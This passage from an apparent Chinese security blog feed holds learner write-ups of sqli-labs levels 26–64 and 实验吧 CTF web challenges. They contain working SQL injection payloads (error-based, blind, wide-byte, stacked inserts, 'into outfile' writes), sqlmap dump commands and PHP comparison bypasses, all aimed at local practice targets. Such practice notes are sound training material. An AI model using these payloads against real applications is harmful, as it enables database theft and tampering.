所以可以不用空格payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8088/sqlilabs/Less-26/?id=0&apos;||updatexml(1,concat(&apos;,(database())),0)||&apos;1&apos;=&apos;1    http://localhost:8088/sqlilabs/Less-26/?id=0&apos;||updatexml(1,concat(&apos;,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&apos;security&apos;))),0)||&apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure></p><p>发现没有   union select  中间的空格是避免不了的  但是其他的可以用括号绕过。第三种也很厉害：构造没有空格的盲注语句如：<br><strong><code>id=1&#39;%26%26(ascii(mid((select(group_concat(schema_name))from(infoorrmation_schema.schemata)),1,1))&gt;65)||&#39;1&#39;=&#39;</code></strong><br>也是充分运用了括号进行绕过（注意  information变成了infoorrmation 因为or被过滤）</p><p>26a、这个题我判断的是’闭合但是没法进一步判断有没有()  注意注意  新姿势来了  两种方法查看是否有（）闭合</p><pre><code>1. 2&apos;&amp;&amp;&apos;1&apos;=&apos;1</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* 若查询语句为where id=&apos;$id&apos;，查询时是where id=&apos;2&apos;&amp;&amp;&apos;1&apos;=&apos;1&apos;，结果是where id=&apos;2&apos;，回显会是id=2。</span><br><span class="line"></span><br><span class="line">        * 若查询语句为where id=(&apos;$id&apos;)，查询时是where id=(&apos;2&apos;&amp;&amp;&apos;1&apos;=&apos;1&apos;)，MySQL 将&apos;2&apos;作为了 Bool 值，结果是where id=(&apos;1&apos;)，回显会是id=1。</span><br></pre></td></tr></table></figure><pre><code>1. 1&apos;)||&apos;1&apos;=(&apos;1若查询语句有小括号正确回显，若无小括号错误回显（无回显）。</code></pre><p>发现需要用()闭合  然后就和26一样了   （但是它关闭了错误回显  所以不能用报错注入）</p><ol start="27"><li>第27题<br>其实挺简单  主要是需要代码审计  它过滤很不严格  过滤了空格  注释  但是select  与 Union 过滤不严格  居然可以随机大小写绕 过 于是它和26一样3种解法</li></ol><p>27a、”闭合的27题</p><ol start="28"><li>第28题<br>首先试出来要用’)来闭合  但是updatexml报错注入失败了  应该是关掉了错误回显发现bool盲注是可以成功的其次  特殊url编码依旧可以绕过空格过滤28a、闭合还是’)     bool注入还是没问题  好像还可以多写来绕过</li></ol><p>29-31. 第29-31题<br>这个是双服务器  需要搭建tomcat来解析jsp文件  再通过tomcat去访问apache来获取数据库信息返回给客户   此时 tomcat 其实起的是一个WAF的作用  真正与数据库交互还是在apache上  但是我tomcat配置好了但是好像sqli下载的时候出问题了  没发现jsp文件。。。<a href="http://localhost:8080/sqlilabs/Less-29/?id=1&amp;id=2&#39;这个就是payload了" target="_blank" rel="noopener">http://localhost:8080/sqlilabs/Less-29/?id=1&amp;id=2&#39;这个就是payload了</a>  tomcat只检查第一个id  而  apache看后一个id所以我们在 后一个id中注入</p><ol start="32"><li><p>第32题<br>发现题目只是把’  “  过滤了  首先想到宽字节注入  结果。。。我不知道为啥  我以前笔记里的宽字节注入用不上  wp里的宽字节真好用….算是学习了   但是发现一点问题  我看这个网页的head里面明明是utf-8编码呀  怎么会这样。。。。</p></li><li><p>第33题<br>和32一模一样  只是32用的是自己写的函数过滤  33用的是php自带的 addslashes()</p></li><li><p>第34题<br>又是post   又得打开Burp  有点烦。。这个题我没有看wp  我只是试了一下宽字节注入  发现存在注入点  但是没有错误回显  但是可 以bool注入  反正username就存在注入点uname=admin%bb%27 or 1 limit 1,2%23&amp;passwd=1&amp;submit=Submit可以改变limit实现平行越权 注入  当然bool注入也可以</p></li><li><p>第35题<br>这题有毒吧   测试发现’  “被转义  而且宽字节注入无效   我还以为有其它骚姿势  结果这是整型注入  不需要闭合。。。<br>而没有错误回显时，我们又应该怎么判断是数字型注入还是引号被过滤呢？在能分辨出正确回显和错误回显（有固定字符串）时，id=1正确回显，尝试id=1’和id=1”：</p><ul><li><strong><code>若两者都正确回显：很可能是被过滤引号</code></strong></li><li><strong><code>若两者都错误回显：很可能是数字型查询</code></strong></li><li><strong><code>若一正确一错误：基本可确定是字符型查询</code></strong></li></ul></li><li><p>第36题<br>可以发现’  “  被转义  然后直接宽字节  ok目前发现  mysql需要将语言设置为GBK才能完全防范宽字节注入   <strong>Mysql_set_charset(‘gbk’,’$conn’)</strong>还有就是   mysql_real_escape_string(),addslashes()这些转义函数都会被宽字节注入</p></li><li><p>第37题<br>又是一个普通的宽字节注入  真是醉了  但是这个怎么只有两个字段了。。。payload：  uname=-11%bb%27 union select 1,database()%23&amp;passwd=1&amp;submit=Submit</p></li><li><p>第38题<br>莫名奇妙注入成功了。。。。真是有毒  啥也不过滤 不过后来发现   这是堆叠注入  也就是说  在参数后面来一个   ;  然后开始第二个sql语句  这样既可以拿shell  又可以做一些其他的事</p></li><li><p>第39题<br>与38不同的就是整型注入</p></li><li><p>第40题<br>可以直接盲注  用’)闭合</p></li><li><p>第41题<br>整型的40题38-41   其实主要考察堆叠注入   我们可以用堆叠注入空造一个账号  也可以删库跑路  导出一句话 。</p></li><li><p>第42题<br>网上说是堆叠注入  但是网上的payload我用不了  不知道为啥 ？？？？？？？？？？？？但是password是有注入点的   直接闭合后可 以联合查询注入</p></li><li><p>第43题<br>与42不同的地方是’)闭合</p></li><li><p>第44题<br>这个题目有意思  它没有报错回显  只有登录成功与登录失败  我发现password=2可以  2’  2”都不行 刚开始还以为是注入整型注入   结果。。。。<br>当 POST 没有报错回显时，判断查询语句就需要构造永真条件同化登录失败与查询出错，通过返回的图片不同来确定是否符合查询语句闭合的条件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">login_user=admin&amp;login_password=1 or 1=1--+</span><br><span class="line">login_user=admin&amp;login_password=1&apos; or 1=1--+</span><br><span class="line">login_user=admin&amp;login_password=1&quot; or 1=1--+</span><br><span class="line">login_user=admin&amp;login_password=1&apos;) or 1=1--+</span><br><span class="line">login_user=admin&amp;login_password=1&quot;) or 1=1--+</span><br></pre></td></tr></table></figure></li></ol><p>所以要这样一套尝试才行。。。</p><ol start="45"><li><p>第45题<br>与44不同在于’)闭合</p></li><li><p>第46题<br>这个题让你添加一个叫sort的get参数   然后数字是几  就按照第几排排序<br>这个主要出现在一些有表格的网页中  网页中如果带有order  sort  等参数就可以用到<br>sort=1 asc升序     sort=1 desc降序  通过这个可以判定这个是注入点<br>我们发现   sort在1,2,3的时候正确  其他情况下会报错  于是我们想到可以bool注入<br>但是问题来了   sort=(select 1)  与  sort=(select 0)的情况居然一样<br>然后  wp说  试试rand()函数  发现sort=rand(1)  与  sort=rand(0)的情况不一样<br>所以就可以bool注入<br><strong><code>http://localhost:8088/sqlilabs/Less-46/?sort=rand((ascii(mid((select database()),1,1)))&gt;65)</code></strong></p></li></ol><p>还有一种办法   就是基于双注入的报错注入  （order by 只能接一个字段  所以要派生表）<br><strong><code>http://localhost:8088/sqlilabs/Less-46/?sort=(select 1 from (select count(*),concat_ws(&#39;-&#39;,(select database()),floor(rand()*2))as a from information_schema.tables group by a) b)</code></strong></p><ol start="47"><li>第47题<br>与46题不同的在于需要单引号闭合  我真是有点蒙  这个order by 居然也能单引号闭合  不过他有报错提升  显然  报错注入稳了<br><strong><code>?sort=1&#39; and (select 1 from (select count(*),concat_ws(&#39;-&#39;,(select database()),floor(rand(14)*2))as a from information_schema.tables group by a) b)--+</code></strong></li></ol><p>还有  很牛批的outfile导出函数可以使用<br><strong><code>?sort=1&#39; into outfile &quot;C:\\ProgramData\\MySQL\\MySQL Server 5.7\\Uploads\\data.txt&quot;--+</code></strong></p><p>包括盲注<br><strong><code>?sort=1&#39; and if(ascii(mid(database(),1,1))=115,sleep(0.1),0)--+</code></strong></p><ol start="48"><li><p>第48题<br>发现sort=0的时候页面会变黑  没有错误提示  那么报错注入是没戏了<br>这样的话bool注入就有戏了。<br>而且outfile   时间盲注都可以</p></li><li><p>第49题<br>只是要闭合单引号的48题  时间盲注  oufile</p></li><li><p>第50题<br>可以堆叠注入<br><strong><code>?sort=1;insert into users(id,username,password) values(50,&#39;Less50&#39;,&#39;Less50&#39;)--+</code></strong><br>也可以像46题一样的注入<br>一般后台查询数据库使用的语句都是mysql_query()，<br>而可以堆叠注入的后台使用的是mysqli_multi_query()。</p></li><li><p>第51题<br>单引号闭合的50题<br>?sort=1’;insert into users values(49,’1’,’1’);–+</p></li><li><p>第52题<br>可以直接堆叠注入  只是说没有错误回显 不能报错注入了而已   bool   盲注啥的都行</p></li><li><p>第53题<br>单引号闭合的52题</p></li></ol><hr><h2 id="挑战题"><a href="#挑战题" class="headerlink" title="挑战题"></a>挑战题</h2><ol start="54"><li><p>第54题<br>没有过滤  不好意思  一套联合查询注入搞定了</p></li><li><p>第55题<br>卧槽  这个题目真的有毒   首先它没有报错回显<br>我试id=1可以   id=1’  1”  都不行  所以我就判断是整型注入<br>然后发现  1 and 1=1  可以  1 and 1=2  不行<br>卧槽  这妥妥的整型注入漏洞呀<br>但是  id=-1 union select 1,2,3 就是不行  真是崩溃了<br>wp上说  还有一种叫小括号闭合型整型注入  我的妈耶  这么复杂<br>果然id=1)失败  id=1)–+ 成功<br>真是有毒   然后一套联合查询注入就OK了</p></li><li><p>第56题<br>单引号加小括号的闭合</p></li><li><p>第57题<br>双引号闭合的注入</p></li><li><p>第58题<br>有回显   单引号闭合的报错注入<br>不能联合查询   因为好像数据被排序后输出的</p></li><li><p>第59题<br>这题是整型注入  但是  怎么会双注入不报错呢？？？？？？  好生奇怪</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&apos;challenges&apos;),0x7e))--+</span><br></pre></td></tr></table></figure></li></ol><p>这个payload倒是报错了。。。。。<br>真的奇怪  太奇怪了</p><ol start="60"><li><p>第60题<br>可以从回显看出来是”)闭合   但是卧槽  又是只能extractvalue函数报错  真是奇怪</p></li><li><p>第61题<br>‘))闭合  还是得extractvalue真是活见鬼</p></li><li><p>第62题<br>没有回显  无法联合查询  ‘)闭合成功  看了就是bool注入了</p></li><li><p>第63题<br>‘闭合的bool注入</p></li><li><p>第64题<br>“)闭合的bool注入</p></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;当初刷sqli的记录了，同样的随心所欲，我也不知道为啥，总是不喜欢打标点符号，感觉空格更舒服&lt;br&gt;其实说真的，刷完sqli才感觉自己web安全入门了，真正的感受到了一些漏洞点的存在&lt;br&gt;也找到了一点自信，感觉自己是一名真正的脚本小子了。。。&lt;br&gt;还是得脚踏实地，枯燥系统的刷题，才能更好的理解这些漏洞点的存在，嗯，就是这样。&lt;/p&gt;
    
    </summary>
    
    
      <category term="-刷题记录" scheme="http://yoursite.com/tags/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>实验吧刷题记录</title>
    <link href="http://yoursite.com/2019/05/22/%E5%AE%9E%E9%AA%8C%E5%90%A7%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>http://yoursite.com/2019/05/22/实验吧刷题记录/</id>
    <published>2019-05-22T12:05:50.000Z</published>
    <updated>2019-05-22T13:11:49.145Z</updated>
    
    <content type="html"><![CDATA[<p>这是我早年刷的实验吧的题了，刚入门的小菜鸡，做题只会看wp。。。<br>主要有两点，这些题我分两批刷的，第一次是真的纯小白，刚学完php就硬钢<br>第二次就是脚本小子了，已经刷完了sqli 并且系统的学了一点xss,ssrf,csrf,xxe之类的基础漏洞了，然后开始钢<br>然后这些以前是写在印象笔记里给自己看的。。写的很真性情就是了，有时间我会改成他人可读的版本的<br>正在刷实验吧的同学可以借此少花一点松果，其他的。。。用处不大吧</p><a id="more"></a><ul><li><h4 id="form"><a href="#form" class="headerlink" title="form"></a>form</h4><p>水题啊  爽的很  直接查看源码  发现<br><code>&lt;input type=&quot;hidden&quot; name=&quot;showsource&quot; value=&quot;0&quot;&gt;</code><br>这还得了  果断value改1  然后发送出去<br><img src="/2019/05/22/实验吧刷题记录/1.PNG" alt><br>答案就出来了</p></li><li><h4 id="后台登陆"><a href="#后台登陆" class="headerlink" title="后台登陆"></a>后台登陆</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">    $sql = &quot;SELECT * FROM admin WHERE username = &apos;admin&apos; and password = &apos;&quot;.md5($password,true).&quot;&apos;&quot;;</span><br><span class="line">    $result=mysqli_query($link,$sql);</span><br><span class="line">        if(mysqli_num_rows($result)&gt;0)&#123;</span><br><span class="line">            echo &apos;flag is :&apos;.$flag;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            echo &apos;密码错误!&apos;;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></li></ul><p>这个以前做过。。。。<br><strong>ffifdyop</strong>   md5加密后刚好弱相等于true</p><ul><li><h4 id="what-a-fuck-这是什么鬼东西"><a href="#what-a-fuck-这是什么鬼东西" class="headerlink" title="what a fuck!这是什么鬼东西?"></a>what a fuck!这是什么鬼东西?</h4><p>一片jsfuck而已  控制台一跑   你懂得</p></li><li><h4 id="天网你敢来挑战嘛"><a href="#天网你敢来挑战嘛" class="headerlink" title="天网你敢来挑战嘛"></a>天网你敢来挑战嘛</h4></li></ul><p>这个题在简单中算难的了。。<br>刚好在我目前的极限疯狂试探、<br>源码一句<br><code>&lt;!-- $test=$_GET[&#39;username&#39;]; $test=md5($test); if($test==&#39;0&#39;) --&gt;</code><br>所以和上题相对  来一个md5加密后与0弱相等就行了<br>如： <strong>240610708、QNKCDZO、aabg7XSs、aabC9RqS</strong><br>然后冒出一段网址<br><strong>/user.php?fame=hjkleffifer</strong><br>打开  我去<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$unserialize_str = $_POST[&apos;password&apos;];</span><br><span class="line">$data_unserialize = unserialize($unserialize_str);</span><br><span class="line">if($data_unserialize[&apos;user&apos;] == &apos;???&apos; &amp;&amp; $data_unserialize[&apos;pass&apos;]==&apos;???&apos;)&#123;</span><br><span class="line">print_r($flag);</span><br><span class="line">&#125;</span><br><span class="line">#伟大的科学家php方言道：成也布尔，败也布尔。 回去吧骚年</span><br></pre></td></tr></table></figure></p><p>真是牛批   然后反序列构造呗   然而  这个我不会   我只知道对象的反序列化  这个数组反序列化是a:2:{}这样的<br>然后  。。。。 还有  这个‘？？？’ 不是具体的串  而是某个未知串  需要利用弱相等  真是脑洞大开<br>于是你要知道  “xxxx” == 1<br>所以构造<br><strong>a:2:{s:4:”user”;b:1;s:4:”pass”;b:1;}</strong><br>居然是简单题。。打扰了</p><ul><li><h4 id="因缺思汀的绕过"><a href="#因缺思汀的绕过" class="headerlink" title="因缺思汀的绕过"></a>因缺思汀的绕过</h4></li></ul><p>又是源码审计加sql注入<br>首先看到源码中<br><code>&lt;!--source: source.txt--&gt;</code><br>这不就明朗了嘛哈哈哈哈哈哈哈哈<br>然后源码审计<br><img src="/2019/05/22/实验吧刷题记录/2.PNG" alt></p><p>稍微一读（咳咳其实读了很久）   差不多就是两个知识点    uname参数来注入<br>然后在利用php弱相等来输出flag</p><p>可以看到过滤了很多东西   但是  or  =  #  ‘  limit  什么的都没有过滤这不就可以乱来了哈哈哈哈哈哈</p><p>于是我构造的是1’ or 1=1 limit 1#’    这时它返回     亦可赛艇    这不就sql绕过了嘛哈哈哈哈哈哈</p><p>然而   弱相等却绕不过  我爆破都试过了  也构造不出  1 == str  出来</p><p>这时   无耻的我   又看题解了<br><strong><code>1&#39; or 1 group by pwd with rollup limit 1 offset 2#</code></strong></p><p><strong>group  by  xxxxx  with  rollup    可以在xxxxx中加一行   其中xxxxx的值为null   offset可以套出来原本只有两行  所以加的一行再第三行  所以offset  2   然后得到的key[‘pwd’]  为null  所以我们post[‘pwd’] 填null就行了。</strong> </p><p>其中  offset  是为了绕过逗号  limit 0,1  等价于  limit 1 offset 0**</p><p>![]实验吧刷题记录/3.PNG)</p><ul><li><h4 id="简单的sql注入"><a href="#简单的sql注入" class="headerlink" title="简单的sql注入"></a>简单的sql注入</h4></li></ul><p>我的妈耶  刚开始完全不会。。都不知道从何下手    而且我还把union   写成了  onion   然后一波Bool注入   真是有毒</p><p>这时  看了下题解  并没有用到我不会的知识点诶  </p><p>就是一串联合注入   但是要注意的是   union  select  and  where  包括空格都过滤掉了   解决办法   就是unionunion   这样。。。。。。</p><p>老规矩   首先报库名<br><strong>1’  unionunion  selectselect  database()’</strong></p><p>然后报表名<br><strong>1’  unionunion  selectselect  table_name  fromfom imformation_schema.tables  where  table_schematable_schema  =  ‘库名</strong></p><p>报字段名<br><strong>1’  unionunion  selectselect  column_name  fromfom imformation_schema.columns  where  table_name  =  ‘表名</strong></p><p>最后直接<br><strong>1’  unionunion  selectselect  字段名   fromfrom  表名  wherewhere 1=1’</strong></p><p>这个主要就是考察怎么绕过一些删除   把单词重复一遍就可以了<br>主要是看回显</p><p>OK   记住联合查询注入的步骤。。。</p><ul><li><h4 id="简单的sql注入2"><a href="#简单的sql注入2" class="headerlink" title="简单的sql注入2"></a>简单的sql注入2</h4></li></ul><p>首先查库名：<br><code>id=1&#39;union/**/select/**/database()/**/&#39;</code><br>表名：<br><code>id=1&#39;union/**/select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=&#39;web1&#39;/**/and/**/1=&#39;1</code><br>字段名：<br><code>id=1&#39;union/**/select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_name=&#39;flag&#39;/**/and/**/1=&#39;1</code><br>内容名：<br><code>id=1&#39;union/**/select/**/flag/**/from/**/flag/**/where/**/1=&#39;1</code></p><p>这个考的主要就是/**/相当于空格    它的检测全基于空格来检测的  可以试试unionunion发现它并不过滤</p><p>而且刚开始我没有想到联合查询   直接<code>1&#39;/**/or/**/1=&#39;1</code>  发现爆了一些没用的东西   这个时候  就必须想到联合注入了</p><ul><li><h4 id="简单的sql注入3："><a href="#简单的sql注入3：" class="headerlink" title="简单的sql注入3："></a>简单的sql注入3：</h4><p>没想到最简单的sql注入序号却是3<br>因为它不是过滤  而是直接检测有没有敏感字  所以绕过是绕不过了<br>所以  果断bool注入   sql一跑   出来了<br>先报库<br><strong>sqlmap -u “…………..”  –dbs</strong><br>爆表<br><strong>sqlmap -u “…………..”  -D ‘web1’  –tables</strong><br>爆字段<br><strong>sqlmap -u “…………..”  D ‘web1’  -T ‘flag’ –columns</strong><br>报内容<br><strong>sqlmap -u “…………..”  D ‘web1’  -T ‘flag’ -C ‘flag’ –dump</strong></p></li><li><h4 id="False"><a href="#False" class="headerlink" title="False"></a>False</h4><p>这个题我确实不会 查看的wp  但是  我现在会了<br>sha1()这个函数和md5加密非常相似   都是md4的进化版   不可逆<br><strong>但是   它有一个bug   就是   当参数为数组时   返回false</strong><br>所以我们的参数为name[]=a&amp;password[]=b<br>同理  md5()也有这个漏洞  数组绕过  算是就这样了<br>数组可以绕过的函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">md5(array()) = null</span><br><span class="line">sha1(array()) = null</span><br><span class="line">ereg(pattern,array()) = null vs preg_match(pattern,array) = false</span><br><span class="line">strcmp(array(), &quot;abc&quot;) = null</span><br><span class="line">strpos(array(),&quot;abc&quot;) = null</span><br></pre></td></tr></table></figure></li><li><h4 id="你真的会PHP吗？"><a href="#你真的会PHP吗？" class="headerlink" title="你真的会PHP吗？"></a>你真的会PHP吗？</h4><p>我真的学会PHP了  TOT  认真学了  源码看懂了。。。就是没这么大脑洞。。我能怎么办。。<br>源码</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$info = &quot;&quot;;</span><br><span class="line">$req = [];</span><br><span class="line">$flag=&quot;xxxxxxxxxx&quot;;</span><br><span class="line"></span><br><span class="line">ini_set(&quot;display_error&quot;, false);</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">if(!isset($_POST[&apos;number&apos;]))&#123;</span><br><span class="line">   header(&quot;hint:6c525af4059b4fe7d8c33a.txt&quot;);</span><br><span class="line"></span><br><span class="line">   die(&quot;have a fun!!&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach([$_POST] as $global_var) &#123;</span><br><span class="line">    foreach($global_var as $key =&gt; $value) &#123;</span><br><span class="line">        $value = trim($value);</span><br><span class="line">        is_string($value) &amp;&amp; $req[$key] = addslashes($value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function is_palindrome_number($number) &#123;</span><br><span class="line">    $number = strval($number);</span><br><span class="line">    $i = 0;</span><br><span class="line">    $j = strlen($number) - 1;</span><br><span class="line">    while($i &lt; $j) &#123;</span><br><span class="line">        if($number[$i] !== $number[$j]) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        $i++;</span><br><span class="line">        $j--;</span><br><span class="line">    &#125;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(is_numeric($_REQUEST[&apos;number&apos;]))&#123;</span><br><span class="line">    </span><br><span class="line">   $info=&quot;sorry, you cann&apos;t input a number!&quot;;</span><br><span class="line"></span><br><span class="line">&#125;elseif($req[&apos;number&apos;]!=strval(intval($req[&apos;number&apos;])))&#123;</span><br><span class="line">      </span><br><span class="line">     $info = &quot;number must be equal to it&apos;s integer!! &quot;;  </span><br><span class="line"></span><br><span class="line">&#125;else&#123;</span><br><span class="line"></span><br><span class="line">     $value1 = intval($req[&quot;number&quot;]);</span><br><span class="line">     $value2 = intval(strrev($req[&quot;number&quot;]));  </span><br><span class="line"></span><br><span class="line">     if($value1!=$value2)&#123;</span><br><span class="line">          $info=&quot;no, this is not a palindrome number!&quot;;</span><br><span class="line">     &#125;else&#123;</span><br><span class="line">          </span><br><span class="line">          if(is_palindrome_number($req[&quot;number&quot;]))&#123;</span><br><span class="line">              $info = &quot;nice! &#123;$value1&#125; is a palindrome number!&quot;;</span><br><span class="line">          &#125;else&#123;</span><br><span class="line">             $info=$flag;</span><br><span class="line">          &#125;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line">echo $info;</span><br></pre></td></tr></table></figure><p>这个代码主要让你构造一个key为number的post请求  满足以下请求<br>**1. 不能被is_numeric检查出是整型</p><ol start="2"><li>不能是被is_palindrome_number判定出是回文串</li><li>但是被strrev反转字符串后  又要相等。。**</li></ol><p>这种自相矛盾的要求  显然是要绕过函数了<br>绕过第一个条件  这个函数只要遇到字符串中有%00  或者串尾有%20  就会判定不是整型<br>第二个函数是自己写的  而且稳稳是验证回文的  没有办法  于是我们考虑第三个点<br>第三个的intval函数有一个缺点：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Intval最大的值取决于操作系统。 32 位系统最大带符号的 integer 范围是 -2147483648 到 2147483647。举例，在这样的系统上， intval(&apos;1000000000000&apos;) 会返回 2147483647。64 位系统上，最大带符号的 integer 值是 9223372036854775807。</span><br><span class="line"></span><br><span class="line">通过上面我们知道服务器的操作系统是32位的，所以我们构造2147483647就可以同时满足2，3条件。</span><br></pre></td></tr></table></figure></p><p>因为反过来的数字大于2147483647所以被intval函数处理后还是等于2147483647<br>所以可以绕过第三点 最后Payload： 2147483647%00  或    2147483647%20<br>还可以利用科学计数法  让0=0    构造   0e-0%00 或者0e+0%00  都一样  - + 是为了避开回文用的</p><ul><li><h4 id="NSCTF-web200"><a href="#NSCTF-web200" class="headerlink" title="NSCTF web200"></a>NSCTF web200</h4>这个题  我觉得挺简单的  只是考察了PHP最基本的代码审计<br><img src="/2019/05/22/实验吧刷题记录/4.bmp" alt><br>这个就是题目  所以我们只要按着他的加密顺序反着来就行了<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function decode($str)&#123;</span><br><span class="line">    $_o=base64_decode(strrev(str_rot13($str)));</span><br><span class="line">    $_ = &quot;&quot;;</span><br><span class="line">    for($_0=0;$_0&lt;strlen($_o);$_0++)&#123;</span><br><span class="line">        $_c = substr($_o,$_0,1);</span><br><span class="line">        $__ = ord($_c)-1;</span><br><span class="line">        $_c = chr($__);</span><br><span class="line">        $_ = $_ . $_c;</span><br><span class="line">    &#125;</span><br><span class="line">    echo strrev($_);</span><br><span class="line">&#125;</span><br><span class="line">decode(&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;);</span><br></pre></td></tr></table></figure></li></ul><p>这个是解码脚本   PHP写代码能力还是太弱了。。</p><ul><li><h4 id="Guess-Next-Session"><a href="#Guess-Next-Session" class="headerlink" title="Guess Next Session"></a>Guess Next Session</h4></li></ul><p>这个题真的打击到我了。。耻辱  简直耻辱<br>很简单的题目明明很简单的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">if (isset ($_GET[&apos;password&apos;])) &#123;</span><br><span class="line">    if ($_GET[&apos;password&apos;] == $_SESSION[&apos;password&apos;])</span><br><span class="line">        die (&apos;Flag: &apos;.$flag);</span><br><span class="line">    else</span><br><span class="line">        print &apos;&lt;p&gt;Wrong guess.&lt;/p&gt;&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这是什么神仙操作呀  太简单了吧  输入的password与session中的一样就行了吧<br>而且还是弱相等   我数组  bool  各种试过了<br>还是不行<br>结果   居然是。。啊啊啊啊贼有毒<br>我一直以为seesion是服务器端的东西  与客户端完全无关   结果不是  session与你cookie里面的sessionid密不可分<br><strong>浏览器发送一个不存在的,或直接为空的sessid，服务端在收到这个陌生的id后会新建一个session节点，节点的值初始化时一般为空或0  所以我们只需要发送一个新sessionid就行了<br>同时password这个参数啥也不用传进去  就能过isset函数  只是值为null<br>刚好弱相等  over。。。。。</strong></p><ul><li><h4 id="PHP大法"><a href="#PHP大法" class="headerlink" title="PHP大法"></a>PHP大法</h4>我很难受  现在居然做题都需要看题解了  我还以为自己已经有一点水平了。。。<br>话不多说  显然审查源码题  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(eregi(&quot;hackerDJ&quot;,$_GET[id])) &#123;</span><br><span class="line">  echo(&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;);</span><br><span class="line">  exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_GET[id] = urldecode($_GET[id]);</span><br><span class="line">if($_GET[id] == &quot;hackerDJ&quot;)</span><br><span class="line">&#123;</span><br><span class="line">  echo &quot;&lt;p&gt;Access 